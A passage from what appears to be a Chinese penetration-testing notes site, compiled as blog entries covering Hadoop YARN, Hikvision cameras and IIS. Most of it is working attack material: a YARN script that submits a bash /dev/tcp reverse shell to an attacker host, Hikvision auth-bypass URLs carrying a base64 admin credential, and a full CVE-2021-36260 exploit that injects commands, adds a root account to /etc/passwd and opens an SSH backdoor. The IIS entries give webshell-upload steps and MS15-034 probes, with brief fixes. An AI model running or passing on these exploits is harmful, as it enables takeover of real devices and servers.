<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &#x27;http://172.31.153.41:8088/&#x27;</span><br><span class="line">lhost = &#x27;xx&#x27; # 修改lhost反弹shell的IP</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/8080 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复：">1.3.0.2. 漏洞修复：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、开启身份验证，防止未经授权用户访问。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB应用</category>
      </categories>
  </entry>
  <entry>
    <title>Hikvision</title>
    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Hikvison.html</url>
    <content><![CDATA[<h1 id="Hikvision摄像头">1. Hikvision摄像头</h1><h2 id="CVE-2017-7921-身份认证绕过">1.1. CVE-2017-7921(身份认证绕过)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先访问	</span><br><span class="line">/Security/users?auth=YWRtaW46MTEK </span><br><span class="line">再访问	</span><br><span class="line">/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br><span class="line">一直刷新可以一直获取当前快照</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916182925765.png" alt="image-20220916182925765"></p>
<h2 id="CVE-2021-36260-RCE">1.2. CVE-2021-36260(RCE)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-36260.py --rhost x.x.x.x --port 80 --cmd &quot;ls -all&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916182504585.png" alt="image-20220916182504585"></p>
<h3 id="EXP">1.2.1. EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span><br><span class="line"># Exploit Author: bashis</span><br><span class="line"># Vendor Homepage: https://www.hikvision.com/</span><br><span class="line"># Version: 1.0</span><br><span class="line"># CVE: CVE-2021-36260</span><br><span class="line"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span><br><span class="line"></span><br><span class="line"># All credit to Watchful_IP</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Note:</span><br><span class="line">1)  This code will _not_ verify if remote is Hikvision device or not.</span><br><span class="line">2)  Most of my interest in this code has been concentrated on how to</span><br><span class="line">    reliably detect vulnerable and/or exploitable devices.</span><br><span class="line">    Some devices are easy to detect, verify and exploit the vulnerability,</span><br><span class="line">    other devices may be vulnerable but not so easy to verify and exploit.</span><br><span class="line">    I think the combined verification code should have very high accuracy.</span><br><span class="line">3)  &#x27;safe check&#x27; (--check) will try write and read for verification</span><br><span class="line">    &#x27;unsafe check&#x27; (--reboot) will try reboot the device for verification</span><br><span class="line"></span><br><span class="line">[Examples]</span><br><span class="line">Safe vulnerability/verify check:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check</span><br><span class="line"></span><br><span class="line">Safe and unsafe vulnerability/verify check:</span><br><span class="line">(will only use &#x27;unsafe check&#x27; if not verified with &#x27;safe check&#x27;)</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot</span><br><span class="line"></span><br><span class="line">Unsafe vulnerability/verify check:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot</span><br><span class="line"></span><br><span class="line">Launch and connect to SSH shell:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell</span><br><span class="line"></span><br><span class="line">Execute command:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;</span><br><span class="line"></span><br><span class="line">Execute blind command:</span><br><span class="line">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;</span><br><span class="line"></span><br><span class="line">$./CVE-2021-36260.py -h</span><br><span class="line">[*] Hikvision CVE-2021-36260</span><br><span class="line">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span><br><span class="line">usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]</span><br><span class="line">                         [--reboot] [--shell] [--cmd CMD]</span><br><span class="line">                         [--cmd_blind CMD_BLIND] [--noverify]</span><br><span class="line">                         [--proto &#123;http,https&#125;]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --rhost RHOST         Remote Target Address (IP/FQDN)</span><br><span class="line">  --rport RPORT         Remote Target Port</span><br><span class="line">  --check               Check if vulnerable</span><br><span class="line">  --reboot              Reboot if vulnerable</span><br><span class="line">  --shell               Launch SSH shell</span><br><span class="line">  --cmd CMD             execute cmd (i.e: &quot;ls -l&quot;)</span><br><span class="line">  --cmd_blind CMD_BLIND</span><br><span class="line">                        execute blind cmd (i.e: &quot;reboot&quot;)</span><br><span class="line">  --noverify            Do not verify if vulnerable</span><br><span class="line">  --proto &#123;http,https&#125;  Protocol used</span><br><span class="line">$</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from requests import packages</span><br><span class="line">from requests.packages import urllib3</span><br><span class="line">from requests.packages.urllib3 import exceptions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Http(object):</span><br><span class="line">    def __init__(self, rhost, rport, proto, timeout=60):</span><br><span class="line">        super(Http, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rhost = rhost</span><br><span class="line">        self.rport = rport</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">        self.remote = None</span><br><span class="line">        self.uri = None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot;</span><br><span class="line">        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">        self.remote = requests.Session()</span><br><span class="line"></span><br><span class="line">        self._init_uri()</span><br><span class="line"></span><br><span class="line">        self.remote.headers.update(&#123;</span><br><span class="line">            &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;,</span><br><span class="line">            &#x27;Accept&#x27;: &#x27;*/*&#x27;,</span><br><span class="line">            &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">            &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;,</span><br><span class="line">            &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">            &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.remote.proxies.update(&#123;</span><br><span class="line">            # &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def send(self, url=None, query_args=None, timeout=5):</span><br><span class="line"></span><br><span class="line">        if query_args:</span><br><span class="line">            &quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot;</span><br><span class="line">            if len(query_args) &gt; 22:</span><br><span class="line">                print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;)</span><br><span class="line">                return None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot;This weird code will try automatically switch between http/https</span><br><span class="line">        and update Host</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            if url and not query_args:</span><br><span class="line">                return self.get(url, timeout)</span><br><span class="line">            else:</span><br><span class="line">                data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line">        except requests.exceptions.ConnectionError:</span><br><span class="line">            self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27;</span><br><span class="line">            self._init_uri()</span><br><span class="line">            try:</span><br><span class="line">                if url and not query_args:</span><br><span class="line">                    return self.get(url, timeout)</span><br><span class="line">                else:</span><br><span class="line">                    data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                return None</span><br><span class="line">        except requests.exceptions.RequestException:</span><br><span class="line">            return None</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">        &quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        if data.status_code == 302:</span><br><span class="line">            redirect = data.headers.get(&#x27;Location&#x27;)</span><br><span class="line">            self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)]</span><br><span class="line">            self._update_host()</span><br><span class="line">            if url and not query_args:</span><br><span class="line">                return self.get(url, timeout)</span><br><span class="line">            else:</span><br><span class="line">                data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout)</span><br><span class="line"></span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line">    def _update_host(self):</span><br><span class="line">        if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]:</span><br><span class="line">            self.remote.headers.update(&#123;</span><br><span class="line">                &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:],</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">    def _init_uri(self):</span><br><span class="line">        self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))</span><br><span class="line"></span><br><span class="line">    def put(self, url, query_args, timeout):</span><br><span class="line">        &quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot;</span><br><span class="line">        query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \</span><br><span class="line">                     f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27;</span><br><span class="line">        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)</span><br><span class="line"></span><br><span class="line">    def get(self, url, timeout):</span><br><span class="line">        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    status_code == 200 (OK);</span><br><span class="line">        Verified vulnerable and exploitable</span><br><span class="line">    status_code == 500 (Internal Server Error);</span><br><span class="line">        Device may be vulnerable, but most likely not</span><br><span class="line">        The SDK webLanguage tag is there, but generate status_code 500 when language not found</span><br><span class="line">        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)</span><br><span class="line">        (Issue: Could also be other directory than &#x27;webLib&#x27;, r/o FS etc...)</span><br><span class="line">    status_code == 401 (Unauthorized);</span><br><span class="line">        Defiantly not vulnerable</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if args.noverify:</span><br><span class="line">        print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/&#x27;, query_args=None)</span><br><span class="line">    if data is None:</span><br><span class="line">        print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;)</span><br><span class="line">        return None</span><br><span class="line">    print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;))</span><br><span class="line"></span><br><span class="line">    data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;)</span><br><span class="line">    if data is None or data.status_code == 404:</span><br><span class="line">        print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    status_code = data.status_code</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/c&#x27;, query_args=None)</span><br><span class="line">    if not data.status_code == 200:</span><br><span class="line">        &quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot;</span><br><span class="line">        if status_code == 500:</span><br><span class="line">            print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;)</span><br><span class="line">            if args.reboot:</span><br><span class="line">                return check_reboot(remote, args)</span><br><span class="line">        else:</span><br><span class="line">            print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    print(&#x27;[!] Remote is verified exploitable&#x27;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_reboot(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    We sending &#x27;reboot&#x27;, wait 2 sec, then checking with GET request.</span><br><span class="line">    - if there is data returned, we can assume remote is not vulnerable.</span><br><span class="line">    - If there is no connection or data returned, we can assume remote is vulnerable.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if args.check:</span><br><span class="line">        print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;)</span><br><span class="line">    remote.send(query_args=&#x27;reboot&#x27;)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    if not remote.send(url=&#x27;/&#x27;, query_args=None):</span><br><span class="line">        print(&#x27;[!] Remote is vulnerable&#x27;)</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;[+] Remote is not vulnerable&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cmd(remote, args):</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;)</span><br><span class="line">    if data is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    data = remote.send(url=&#x27;/x&#x27;, query_args=None)</span><br><span class="line">    if data is None or not data.status_code == 200:</span><br><span class="line">        print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    print(data.text)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cmd_blind(remote, args):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Blind command injection</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;)</span><br><span class="line">    if data is None or not data.status_code == 500:</span><br><span class="line">        print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;)</span><br><span class="line">        return False</span><br><span class="line">    print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shell(remote, args):</span><br><span class="line">    if not check(remote, args):</span><br><span class="line">        return False</span><br><span class="line">    data = remote.send(url=&#x27;/N&#x27;, query_args=None)</span><br><span class="line"></span><br><span class="line">    if data.status_code == 404:</span><br><span class="line">        print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;)</span><br><span class="line">        data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;)</span><br><span class="line">        if data.status_code == 401:</span><br><span class="line">            print(data.headers)</span><br><span class="line">            print(data.text)</span><br><span class="line">            return False</span><br><span class="line">        remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;)</span><br><span class="line">        remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;)</span><br><span class="line"></span><br><span class="line">    print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;)</span><br><span class="line">    os.system(f&#x27;stty echo; stty iexten; stty icanon; \</span><br><span class="line">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \</span><br><span class="line">    P@&#123;args.rhost&#125; -p 1337&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#x27;[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27;</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27;</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    remote = Http(args.rhost, args.rport, args.proto)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        if args.shell:</span><br><span class="line">            shell(remote, args)</span><br><span class="line">        elif args.cmd:</span><br><span class="line">            cmd(remote, args)</span><br><span class="line">        elif args.cmd_blind:</span><br><span class="line">            cmd_blind(remote, args)</span><br><span class="line">        elif args.check:</span><br><span class="line">            check(remote, args)</span><br><span class="line">        elif args.reboot:</span><br><span class="line">            check_reboot(remote, args)</span><br><span class="line">        else:</span><br><span class="line">            parser.parse_args([&#x27;-h&#x27;])</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">            </span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络设备</category>
      </categories>
  </entry>
  <entry>
    <title>IIS</title>
    <url>/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/IIS.html</url>
    <content><![CDATA[<h1 id="IIS-6-0解析漏洞">1. IIS 6.0解析漏洞</h1><h2 id="漏洞原理：">1.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在 IIS5.x/6.0 中，默认会将 **.asp（*.asa、*.cer、*.cdx ）目录下的所有文件当成 Asp 解析。</span><br><span class="line">2、在 IIS5.x/6.0 中，默认会将 **.asp;（*.asa;.jpg、*.cer;.jpg） 这种格式的文件名，当成 Asp 解析，是因为服务器默认不解析; 号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、IIS 5.x/6.0</span><br></pre></td></tr></table></figure>

<p>More info : Getshell 需要存在文件上传点</p>
<h2 id="漏洞复现">1.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、信息收集时发现服务器为 IIS 5.x/6.0</span><br><span class="line">2、登录页面存在任意用户注册</span><br><span class="line">3、登录后台后找到上传点，用解析漏洞绕过限制上传木马文件,获取文件路径</span><br><span class="line">4、使用 webshell 管理工具如菜刀等进行连接</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/edC1IB9WJviUNFK.png" alt="image-20220710142609352"></p>
<p><img src="https://s2.loli.net/2022/07/10/e9gBsSwM8PpoAlO.png" alt="image-20220710142629099"></p>
<p><img src="https://s2.loli.net/2022/07/10/vaoTZpuLW4VYQcw.png" alt="image-20220710142801065"></p>
<h1 id="IIS-PUT文件上传">2. IIS PUT文件上传</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-iis-put-getshell</span><br><span class="line">set:</span><br><span class="line">  filename: randomLowercase(6)</span><br><span class="line">  fileContent: randomLowercase(6)</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line">  - method: PUT</span><br><span class="line">    path: /&#123;&#123;filename&#125;&#125;.txt</span><br><span class="line">    body: |</span><br><span class="line">      &#123;&#123;fileContent&#125;&#125;</span><br><span class="line">    expression: |</span><br><span class="line">      response.status == 201</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /&#123;&#123;filename&#125;&#125;.txt</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.status == 200 &amp;&amp; response.body.bcontains(bytes(fileContent))</span><br><span class="line"></span><br><span class="line">detail:</span><br><span class="line">  author: Cannae(github.com/thunderbarca)</span><br><span class="line">  links:</span><br><span class="line">    - https://www.cnblogs.com/-mo-/p/11295400.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="IIS-7-x解析漏洞">3. IIS 7.x解析漏洞</h1><h2 id="漏洞原理：-1">3.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS7.x版本 在Fast-CGI运行模式下,在任意文件，例如:1.jpg后面加上/.php，会将1.jpg 解析为php文件。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本-1">3.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、IIS7.x</span><br></pre></td></tr></table></figure>

<p>More info : Getshell 需要存在文件上传点</p>
<h2 id="漏洞复现-1">3.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、找到文件上传点，上传图片马，获得图片路径</span><br><span class="line">2、访问木马的时候加解析漏洞加/.php（asp） 访问</span><br><span class="line">3、连接木马</span><br></pre></td></tr></table></figure>

<h1 id="IIS短文件名漏洞">4. IIS短文件名漏洞</h1><h2 id="漏洞原理">4.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)会生成了对应的windows 8.3短文件名。</span><br><span class="line">IIS的短文件名机制,可以暴力猜解短文件名,访问构造的某个存在的短文件名,会返回404,访问构造的某个不存在的短文件名,返回400。</span><br><span class="line"></span><br><span class="line">短文件名规则:</span><br><span class="line">	1、文件名前缀/文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名</span><br><span class="line">	2、后缀名最长只显示3位</span><br><span class="line">	3、只显示前6为英文为字母都转为大写</span><br><span class="line">	4、包含空格或者其他部分特殊字符,不论长度均会生成短文件</span><br><span class="line">	5、如果存在文件名类似的文件,则前面的6个字符是相同的,后面的数字进行递增</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/3UhYiqVpzHGLJWT.png" alt="image-20220710150724472"></p>
<h2 id="影响版本-2">4.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全版本都可能存在</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现-2">4.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、若靶机192.168.10.130服务器 WEB 根目录下存在一个 abcdef123456.txt 的文件,浏览器分别访问下列网站则 （*可以代替0个及以上的字符）</span><br><span class="line">http://192.168.10.130/a*~1*/a.aspx	 code 404	存在</span><br><span class="line">http://192.168.10.130/b*~1*/a.aspx	 code 400	不存在</span><br><span class="line">2、再访问</span><br><span class="line">http://192.168.10.130/ab*~1*/a.aspx	 code 404	存在</span><br><span class="line">http://192.168.10.130/aa*~1*/a.aspx	 code 400	不存在</span><br><span class="line">3、以此类推可得到</span><br><span class="line">http://192.168.10.130/abcdef*~1*/a.aspx</span><br><span class="line">4、再访问</span><br><span class="line">http://192.168.10.130/abcdef*~1/a.aspx	code 404 为文件夹	code 400 为文件</span><br><span class="line">5、再访问</span><br><span class="line">http://192.168.10.130/abcdef*~1.t*/a.aspx	code 404	存在</span><br><span class="line">http://192.168.10.130/abcdef*~1.a*/a.aspx	code 400	不存在</span><br><span class="line">6、以此类推可得到</span><br><span class="line">http://192.168.10.130/abcdef*~1.txt/a.aspx</span><br><span class="line">所以该短文件名为abcdef*~1.txt</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复：">4.4. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1。</span><br><span class="line">2、禁止url中使用“~”或它的Unicode编码。</span><br></pre></td></tr></table></figure>

<h1 id="HTTP-sys远程代码执行漏洞（MS15-034）">5. HTTP.sys远程代码执行漏洞（MS15-034）</h1><h2 id="漏洞原理-1">5.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本-3">5.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、Windows 7</span><br><span class="line">2、Windows 8</span><br><span class="line">3、Windows server 2008</span><br><span class="line">4、Windows server 2012</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现-3">5.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、使用 burp 抓包增加 </span><br><span class="line">Range: bytes=0-18446744073709551615 </span><br><span class="line">返回 416 Requested Range Not Satisfiable 即存在该漏洞</span><br><span class="line">2、使用 curl 工具（kali自带）</span><br><span class="line">curl -v http://www.test.com -H &quot;IP地址&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;</span><br><span class="line">返回 416 Requested Range Not Satisfiable 即存在该漏洞</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/10/uBd2C3mRUD8GY4H.png" alt="image-20220710145000025"></p>
<h2 id="漏洞修复">5.4. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁用IIS内核缓存。</span><br><span class="line">2、更新系统，微软已经发布了相关补丁：https://technet.microsoft.com/zh-cn/library/security/MS15-034。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>中间件</category>
      </categories>
  </entry>
  <entry>
    <title>JDWP RCE</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Java/Jdwp.html</url>
